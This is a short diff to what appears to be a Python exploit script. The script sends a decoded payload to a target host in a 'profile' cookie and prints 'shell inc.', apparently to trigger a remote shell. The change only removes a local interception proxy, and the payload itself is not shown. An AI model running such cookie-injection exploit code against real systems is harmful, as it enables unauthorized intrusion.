@@ -63,9 +63,9 @@ SsendData=bsendData.decode("utf-8")
 #print(SsendData)
 
 s=requests.Session()
-proxies = { 'http': 'http://127.0.0.1:8080' }
+#proxies = { 'http': 'http://127.0.0.1:8080' }#use if needed for request capture
 headers = {
     'Cookie':'profile='+SsendData
     }
-r=s.get("http://%s/" % target, allow_redirects=False, headers=headers,proxies=proxies)
+r=s.get("http://%s/" % target, allow_redirects=False, headers=headers)
 print("shell inc.")
